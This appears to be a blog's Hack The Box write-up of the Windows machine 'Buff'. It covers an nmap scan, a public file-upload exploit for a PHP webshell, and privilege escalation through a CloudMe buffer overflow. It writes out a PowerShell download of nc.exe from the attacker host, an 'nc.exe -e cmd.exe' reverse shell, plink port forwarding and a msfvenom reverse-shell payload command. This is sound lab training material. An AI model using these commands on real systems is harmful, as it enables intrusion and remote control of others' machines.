@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Buff&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Buff" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Buff</h1><p class="article date">2020-11-23</p></section><article class="article markdown-body"><h1 id="buff">Buff</h1>
+<p><img  src="Buff_Logo.png"
+        alt="Logo"/></p>
+<p>Buff is a windows box that features the website for a Gym Membership software and a simple Window stack based buffer overflow.</p>
+<h2 id="scanning-and-enumeration">Scanning and Enumeration</h2>
+<p>First thing to note about this box is it seems to have some odd things port wise. Example of that below. The only port that should be open is 8080. There isn&rsquo;t anything to do with the other ports and we aren&rsquo;t sure why it shows up consistently.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nightwolf@kali:~/CTFs/HTB/Buff$ sudo nmap -A -p- 10.10.10.198
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> nightwolf:
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-18 13:08 MDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.198
+Host is up <span style="color:#f92672">(</span>0.41s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6<span style="color:#f92672">)</span>
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n<span style="color:#960050;background-color:#1e0010">&#39;</span>s Bro Hut
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches <span style="color:#66d9ef">for</span> host
+Network Distance: <span style="color:#ae81ff">2</span> hops
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 8080/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   82.14 ms  10.10.14.1
+<span style="color:#ae81ff">2</span>   778.91 ms 10.10.10.198
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 258.90 seconds
+</code></pre></div><p>Seems like there is a web page server on port 8080. Let&rsquo;s go take a look.</p>
+<h2 id="rabbitholes">Rabbitholes</h2>
+<p>I fell down a rabbithole to start with. There is a /Admin page that seems like a place where we could maybe upload a php shell.</p>
+<p>The file upload is disabled but we can fix that.</p>
+<p><img  src="Buff_AdminButtonEnable.png"
+        alt="AdminButton"/></p>
+<p>We play around with it a bit but don&rsquo;t seem to make much progress so we start to look around again.</p>
+<h2 id="foothold">Foothold</h2>
+<p>We eventually climb out of the rabbithole and take a look around the site again. We take a look at <code>/contact.php</code></p>
+<p>This tells us the name and version of the gym site&rsquo;s webapp.</p>
+<p><img  src="Buff_Version.png"
+        alt/></p>
+<p>We run a google search on it and found it has a lovely vulnerability. <code>https://www.exploit-db.com/exploits/48506</code> This takes advantage of the fact that <code>/upload.php</code> does not check for authentication before allowing uploads. Uploaded files are supposed to only be images but this can be circumvented by adding an image extension on the end of our php shell.</p>
+<p>We pull it down, run it, and instantly drop into a php shell.</p>
+<p><img  src="Buff_Foothold.png"
+        alt="Foothold"/></p>
+<p>We are unable to change directories, since our &ldquo;shell&rdquo; is acutally just a wrapper to send commands nicely to our uploaded php file. but we do have the permissions of the user Shaun. Which allows us to retrieve user.txt.
+<code>C:\xampp\htdocs\gym\upload&gt; type C:\Users\shaun\Desktop\user.txt</code></p>
+<h2 id="shell-stabilization">Shell Stabilization</h2>
+<p>We were able to get our user flag but we are in a really crappy webshell. We need something better going forward. We download a windows netcat binary from <a href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">https://github.com/int0x33/nc.exe/blob/master/nc.exe</a>.</p>
+<p>Then we go to the directory it was downloaded in and start a python http server.
+<code>sudo python3 -m http.server 80</code> We also start a listener with netcat to catch our revers shell. <code>nc -lnvp 3698</code></p>
+<p>Once our server and listener is up. is up we use powershell to transfer the file over and then run use netcat to start our reverse shell.</p>
+<pre><code>powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.24/nc.exe', 'nc.exe')
+.\nc.exe -e cmd.exe 10.10.14.24 3968
+</code></pre><p>Catch our shell, and it is time to start looking for a way to get to root.</p>
+<h2 id="root">Root</h2>
+<p>We check the running processes and find one that is rather stands out. CloudMe.exe There is also a version of this binary in one of our users folders.</p>
+<p>We quickly find an exploit on Exploit DB that seems to likely be applicable. <a href="https://www.exploit-db.com/exploits/44470">https://www.exploit-db.com/exploits/44470</a></p>
+<p>From conversation with others this one works as well. <a href="https://www.exploit-db.com/exploits/48389">https://www.exploit-db.com/exploits/48389</a></p>
+<p>However, there is one challenge. CloudMe does not have a public facing port. We can see the port it uses 8888 is open with <code>netstat -an |find /i &quot;listening&quot;</code> command But we can&rsquo;t see it externally. It is only listening for internal connections.</p>
+<p>We also can&rsquo;t simply run our exploit in our current shell because this system does not have python installed. There are probably a few ways around this. We could maybe rewrite the exploit in another language, or pack it up into an executable, but I opted to set up port forwarding with plink.</p>
+<p>First, we start the ssh service on our attacking machine with, <code>sudo service ssh start</code>.</p>
+<p>Then we transfer plink over the same way we did for netcat and run, <code>.\plink.exe -v -x -R 4444:127.0.0.1:8888 nightwolf@10.10.14.24</code></p>
+<p>We enter our password and plink opens the connection.</p>
+<p><img  src="Buff_PlinkUp.png"
+        alt="PlinkUp"/></p>
+<h4 id="htb-ssh-network-changes">HTB SSH Network changes</h4>
+<p>Not long after I completed this box HTB [made some changes]<a href="https://discordapp.com/channels/473760315293696010/477042310467813376/755799172367515759">https://discordapp.com/channels/473760315293696010/477042310467813376/755799172367515759</a> to the types of traffic permitted on their networks. SSH connections from target boxes to  player machines are now blocked on port 22.</p>
+<p>Because of this we need to take some other options. We can change the port used by SSH to a port other than port 22, or we can use another tool, such as Chisel.</p>
+<h2 id="root-continued">Root: Continued</h2>
+<p>Now we just need to set up our payload. First we change the target connection port to <code>4444</code> to match our port forward then we generate the shell code for our reverse shell using msfvenom.</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=3271 -f c</code></p>
+<p>We start a listener on our local machine with <code>nc -lnvp 3271</code> Time to cross our fingers and hope it works.</p>
+<p><img  src="Buff_PlinkForward.png"
+        alt="PlinkForward"/></p>
+<p>Our connections goes through and our listener catches the reverse shell.</p>
+<p><img  src="Buff_Admin.png"
+        alt="Admin"/></p>
+<p>We check and we have Administrator rights. Type to snag the flag for submission and we are all done!</p>
+<h2 id="wrapup">Wrapup</h2>
+<p>This was one of the first boxes I attempted when returning to HTB and I think it was a pretty good box to start with. It has a few rabbit holes that are easy to slip into but is overall fairly easy and straight forward. The port forwarding aspect was pretty fun to learn and I have certainly made use of it later. Thanks egotisticalSW for creating an awesome box!</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/htb-writeups/blunder_writeup/"><span class="iconfont icon-article"></span>HTB Blunder</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
